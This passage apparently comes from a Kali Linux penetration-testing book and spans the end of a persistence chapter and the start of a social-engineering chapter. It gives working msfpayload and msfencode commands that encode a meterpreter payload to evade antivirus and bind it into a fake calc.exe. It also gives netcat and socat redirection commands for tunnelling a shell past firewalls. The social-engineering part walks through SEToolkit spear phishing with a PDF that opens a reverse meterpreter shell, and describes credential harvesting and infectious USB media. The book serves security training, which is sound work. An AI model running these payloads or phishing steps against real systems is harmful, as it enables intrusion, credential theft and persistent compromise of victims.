command:
msf>msfencode -i attack.exe -o encoded_attack.exe -e
x86/shikata_ga_nai -c 5 -t exe
This encodes the attack.exe agent five times using the shikata_ga_nai protocol.
Each time it is re-encoded, it becomes more difficult to detect. However, the
executable also increases in size.
[ 164 ]
Chapter 6
The full payload can be created directly from the command line in Kali. Not only can
it be encoded, but we can configure the encoding pattern to avoid certain characters.
For example, the following characters should be avoided when encoding a persistent
agent because they may result in discovery and failure of the attack:
• \x00 represents a 0-byte address
• \xa0 represents a line feed
• \xad represents a carriage return
To create a multiencoded payload, use the following command:
msf>msfpayload windows/meterpreter/bind_tcp
LPORT=444 R| msfencode -e x86/shikata_ga_nai -c 5 -t raw -a
x86 -b '\x00\x0a\x0d' -c 5 -x /root/Desktop/attack.exe -o
/root/Desktop/encoded_attack.exe
You can also encode msfpayload to an existing executable, and both the modified
executable and the persistent agent will function. To bind the persistent agent to an
executable such as a calculator (calc.exe), first copy the appropriate calc.exe file
into Metasploit's template folder located at /usr/share/metasploit-framework/
data/templates. When the template is in place, use the following command:
msf>msfpayload windows/meterpreter/bind_tcp
LPORT=444 R| msfencode -t exe -x calc.exe -k -o
encoded_calc_attack.exe -e x86/shikata_ga_nai -c 5
The agent can be placed on the target system, renamed calc.exe to replace the
original calculator, and then executed.
Unfortunately, nearly all Metasploit-encoded executables can be detected by
client antivirus software. This has been attributed to penetration testers who have
submitted encrypted payloads to sites such as VirusTotal (www.virustotal.com).
However, you can create an executable and then encrypt it using Veil-Evasion, as
described in Chapter 4, Exploit.
Redirecting ports to bypass network
controls
Thus far, we've examined remote control access to the exploited system as if we have
a direct connection between the victim and the attacker's machines; however, such
connectivity is frequently controlled or blocked by network devices such as a firewall.
[ 165 ]
Post Exploit – Persistence
Attackers can circumvent these controls using port redirection, which is a designated
system that listens on defined ports and forwards the raw packets to a specific
secondary location.
Kali provides several tools that support port redirection, including nc, cryptcat,
socat, ssh, fpipe, and Metasploit's meterpreter; we'll look at some examples in
the following sections.
Example 1 – simple port redirection
Simple port redirection may be used, for example, if you have compromised a
system on the exterior of the network in the Demilitarized Zone (DMZ) and need
to be able to communicate with an internal system from a remote location.
On the compromised system in the DMZ, configure an instance of Netcat to listen to
incoming commands and forward them to the target using the following command:
root@kali:~# nc -l -p 44444 -e  444
This command will invoke Netcat (nc) to listen (-l) to incoming traffic, and execute
(-e) the transfer of this incoming traffic to the target on port 444. Ports are not fixed
and they do not have to be the same on both the listening/forwarding host and the
final target.
If you lack complete information regarding the target's internal network, you may
try the following command:
root@kali:~# nc -l -p  -c "nc 
This command sets the local (attacker) instance of Netcat to listen (-l) on a
designated port, and then instructs Netcat to create a new process with each
new connection (-c).
This simple example allows the outsider to connect to the direct network; however,
it does not permit a bidirectional data connection, which is required for some tools.
[ 166 ]
Chapter 6
Example 2 – bidirectional port redirection
Consider three separate Windows data systems:
[Attacker] | [Forwarder ] | [Target]
In order to enable a bidirectional communications channel using Netcat, we will
have to use named pipes. A named pipe, also referred to as FIFO, is a means of
creating defined interprocess communication; this allows us to handle it as an object,
making it easier to manage when issuing commands. In the following sample attack,
we create a named pipe called reverse to handle bidirectional communications.
The Attacker has an instance of Netcat on his local system set to listen on port 6661
using the following command:
nc -l 6661
The Forwarder, a compromised box with an instance of Netcat installed, will listen
for incoming packets and forward them to the target; it is configured to listen on port
6666 using the following command:
nc -l 6666
On the target system, enter the following command to create the named pipe:
mkfifo reverse
Then, configure a local instance of Netcat to use that named pipe to establish
two-way communications across the forwarding system to the Attacker using the
following command:
nc localhost 6661 0reverse
The same bidirectional data flow can be achieved using socat, which is designed
to implement connections of this type. The command for this example would be
executed from the target system and use:
socat tcp:localhost:6661 tcp:localhost:6646
[ 167 ]
Post Exploit – Persistence
Summary
In this chapter, we focused on the final stage of the attacker's kill chain—the
command, control, and communications stage—where the attacker uses a persistent
agent to communicate with a compromised system.
That concludes the first part of this book where we examined the attacker's kill chain
in detail to see how it could be applied towards compromising a network or an
isolated system.
In Part 2, The Delivery Phase, we will examine specific applications of the kill chain
using various exploit paths. In Chapter 7, Physical Attacks and Social Engineering, we
will focus on physical security and social engineering attacks. Topics will include
an overview of the attack methodology, crafting hostile USB devices and rogue
microcomputers, the Social Engineering Toolkit, and testing the resilience of a
system to phishing attacks.
[ 168 ]
Part 2
The Delivery Phase
Physical Attacks and
Social Engineering
Exploiting Wireless
Communications
Reconnaissance and Exploitation
of Web-based Applications
Exploiting Remote Access
Communications
Client-side Exploitation
Installing Kali Linux
Physical Attacks and
Social Engineering
Social engineering, especially when combined with physical access to the target
system, is the single most successful attack vector used for penetration testing or
an actual attack.
As an attack route supporting the kill chain, social engineering focuses on the
nontechnical aspects of an attack that take advantage of a person trust and innate
helpfulness to deceive and manipulate them into compromising a network and
its resources.
The success of social engineering attacks relies on two key factors:
• The knowledge that is gained during the reconnaissance phase. The attacker
must know the names and usernames associated with the target; more
importantly, the attacker must understand the concerns of the users on the
network.
• Understanding how to apply this knowledge to convince potential targets
to activate the attack by clicking on a link, or executing a program. For
example, if the target company has just merged with a former competitor, the
job security of employees will likely be the top-of-mind concern. Therefore,
e-mails or documents with titles associated with that subject will likely be
opened by targeted individuals.
Kali Linux provides several tools and frameworks that have an increased chance of
success if social engineering is used as a pretext to influence victims to open files or
execute certain operations. Examples include script attacks (includes Visual Basic,
WMI, and PowerShell scripts), executables created by the Metasploit Framework,
and the BeEF (The Browser Exploitation Framework).
Physical Attacks and Social Engineering
In this chapter, we'll focus on Social Engineering Toolkit or SEToolkit. The
techniques used in employing these tools will serve as the model for using
social engineering to deploy attacks from other tools.
By the end of this chapter, you will learn how to use the SEToolkit to do
the following:
• Obtain a remote shell using spear phishing and Java applet attacks
• Harvest or collect usernames and passwords using the credential
harvester attack
• Launch the tabnabbing and webjacking attacks
• Employ the multi-attack web method
• Use PowerShell's alphanumeric shellcode injection attack
To support SET's social engineering attacks, the following general implementation
practices will be described:
• Hiding malicious executables and obfuscating the attacker's URL
• Escalating an attack using DNS redirection
You will also learn how to create and implement hostile physical devices based on
the Raspberry PI microcomputer.
Social Engineering Toolkit
Social-Engineer Toolkit (SEToolkit) was created and written by David
Kennedy (ReL1K), and it is maintained by an active group of collaborators
(www.social-engineer.org). It is an open source python-driven framework
that is specifically designed to facilitate social engineering attacks.
A significant advantage of SEToolkit is its interconnectivity with the Metasploit
Framework which provides the payloads needed for exploitation, the encryption
to bypass anti-virus, and the listener module that connects to the compromised
system when it sends a shell back to the attacker.
Before launching SEToolkit, you may wish to make some modifications to the
configuration file.
[ 172 ]
Chapter 7
The social engineering toolkit is preconfigured with common default settings;
however, these settings can be altered to adapt the kit to specific attack scenarios. In
Kali, the configuration file is /usr/share/set/config/set_config. Modifying this
file allows you to control the following:
• Metasploit variables, including the location, the database to use, how many
times a payload should be encoded, and commands to automatically run
once a meterpreter session has been established.
• Ettercap and dsniff switches to facilitate DNS redirection attacks and
capture of authentication credentials. By controlling the DNS, an attacker
can automatically direct groups of people to false sites created using the
setoolkit.
• Configuration of sendmail or other mail programs for use in attacks
requiring spoofed e-mail addresses; this allows the social engineer to enhance
the credibility of attacks by using an e-mail address that appears to come
from a trusted source, such as a senior manager in the same company.
• The e-mail provider to be used, including Gmail, Hotmail, and Yahoo.
• Creating self-signed Java applets with a spoofed publisher, activating SSL
certificates, and stealing digital signatures.
• Other variables such as the IP address, port assignments, and encoding
parameters.
To open Social Engineering Toolkit (SET) in Kali distribution, go to Applications |
Kali Linux | Exploitation Tools | Social Engineering Toolkit | setoolkit, or enter
setoolkit at a shell prompt. You will be presented with the main menu, as shown
in the following screenshot:
[ 173 ]
Physical Attacks and Social Engineering
If you select 1) Social-Engineering Attacks, you will be presented with the
following submenu:
The following is a brief explanation of the social engineering attacks :
• Spear-Phishing Attack Vector allows an attacker to create e-mail
messages and send them to targeted victims with attached exploits.
• Website Attack Vectors utilize multiple web-based attacks, including
the following:
° Java Applet Attack Method spoofs a Java certificate and delivers a
Metasploit-based payload. This is one of the most successful attacks,
and it is effective against Windows, Linux, or OSX targets.
° Metasploit Browser Exploit Method delivers a Metasploit
payload using an iFrame attack.
° Credential Harvester Attack Method clones a website and
automatically rewrites the POST parameters to allow an attacker to
intercept and harvest user credentials; it then redirects the victim
back to the original site when harvesting is completed.
° Tabnabbing Attack Method replaces information on an inactive
browser tab with a cloned page that links back to the attacker. When
the victim logs in, the credentials are sent to the attacker.
° Web Jacking Attack Method utilizes iFrame replacements to make
the highlighted URL link appear legitimate; however, when it is
clicked, a window pops up, and is then replaced with a malicious link.
[ 174 ]
Chapter 7
° Multi-Attack Web Method allows an attacker to select some or all
of several attacks that can be launched at once, including The Java
Applet Attack Method, The Metasploit Browser Exploit
Method, Credential Harvester Attack Method, Tabnabbing
Attack Method, and Man Left in the Middle Attack Method.
• Infectious Media Generator creates an autorun.inf file and Metasploit
payload. Once burned or copied to a USB device or physical media (CD or
DVD) and inserted into the target system, it will trigger an autorun (if an
autorun is enabled) and compromise the system.
• The Create a Payload and Listener module is a rapid menu-driven
method of creating a Metasploit payload. The attacker must use a separate
social engineering attack to convince the target to launch it.
• MassMailer Attack allows the attacker to send multiple customized e-mails
to a single e-mail address or a list of recipients.
• Arduino-Based Attack Vector programs Arduino-based devices, such
as the Teensy. Because these devices register as a USB keyboard when
connected to a physical Windows system, they can bypass security based
on disabling the autorun or other endpoint protection.
• SMS Spoofing Attack Vector allows the attacker to send a crafted Short
Message Service text to a person's mobile device, and spoof the source of
the message.
• Wireless Access Point Attack Vector will create a fake wireless access
point and DHCP server on the attacker's system and redirect all DNS queries
to the attacker. The attacker can then launch various attacks, such as the Java
Applet Attack or a credential harvester attack.
• QRcode Generator Attack Vector creates a QRCode with a defined URL
associated with an attack.
• Powershell Attack Vectors allow the attacker to create attacks that rely
on PowerShell, a command-line shell and scripting language available on
all Windows Vista and higher versions.
• Third Party Modules allow the attacker to use the Remote Administration
Tool Tommy Edition (RATTE), as part of a Java Applet Attack or as an
isolated payload. RATTE is a text menu-driven remote access tool.
SEToolkit also gives a menu item for Fast-Track Penetration Testing, which
gives rapid access to some specialized tools that support brute force identification
and password cracking of SQL databases, as well as some customized exploits
that are based on Python, SCCM attack vectors, Dell computer DRAC/chassis
exploitation, user enumeration, and PSEXEC PowerShell injection.
[ 175 ]
Physical Attacks and Social Engineering
The menu also gives options for updating the Metasploit Framework, SEToolkit, and
the SEToolkit configuration. However, these additional options should be avoided as
they are not fully supported by Kali, and may cause conflicts with dependencies.
As an initial example of the SEToolkit's strengths, we'll see how it can be used to
gain a remote shell—a connection made from the compromised system back to the
attacker's system.
Spear Phishing Attack
Phishing is an e-mail fraud attack carried out against a large number of victims,
such as a list of known American Internet users. The targets are generally not
connected, and the e-mail does not attempt to appeal to any specific individual.
Instead, it contains an item of general interest (for example, "Click here for bargain
medications") and a malicious link or attachment. The attacker plays the odds that at
least some people will click on the link attachment to initiate the attack.
On the other hand, spear phishing is a highly specific form of phishing attack—by
crafting the e-mail message in a particular way, the attacker hopes to attract the
attention of a specific audience. For example, if the attacker knows that the sales
department uses a particular application to manage its customer relationships, he
may spoof an e-mail pretending that it is from the application's vendor with a subject
line of "Emergency fix for  - Click link to download".
The success rate of a phishing attack is typically less than five percent;
however, the success rate of a spear phishing attack ranges from forty
to eighty percent. This is why information from the reconnaissance
phase is critical to the success of this type of attack.
On average, only ten to fifteen e-mails need to be sent to a target
before at least one is clicked on.
Before launching the attack, ensure that sendmail is installed on Kali (apt-
get install sendmail) and change the set_config file from SENDMAIL=OFF to
SENDMAIL=ON.
To launch the attack, select Social Engineering Attacks from the main SEToolkit
menu, and then select Spear-Phishing Attack Vectors from the submenu. This
will launch the start options for the attack, as shown in the following screenshot:
[ 176 ]
Chapter 7
Select 1 to perform a mass e-mail attack; you will then be presented with a list of
attack payloads, as shown in the following screenshot:
One of the most effective attacks is 15) Adobe PDF Embedded EXE Social
Engineering; however, the attack selected will vary with the attacker's knowledge
of available targets gained during the reconnaissance phase.
[ 177 ]
Physical Attacks and Social Engineering
When prompted to use your own PDF or a built-in blank PDF for the attack as
shown in the following screenshot, select 2 for the built-in blank payload. You will
then be prompted to select the payload.
Through testing on multiple networks, we have found that options 1 and 2
(Windows Reverse TCP shell, and Windows Meterpreter Reverse TCP) are
the most reliable payloads. For this example, we will select Windows Meterpreter
Reverse TCP—when the PDF is opened, it will execute a reverse shell back to the
attacking system.
In instances where stealth is more important than reliability, Windows Meterpreter
Reverse HTTPS is the best option.
SEToolkit will prompt for the payload listener (the attacker's IP address) and
listening port, with the default port of 443.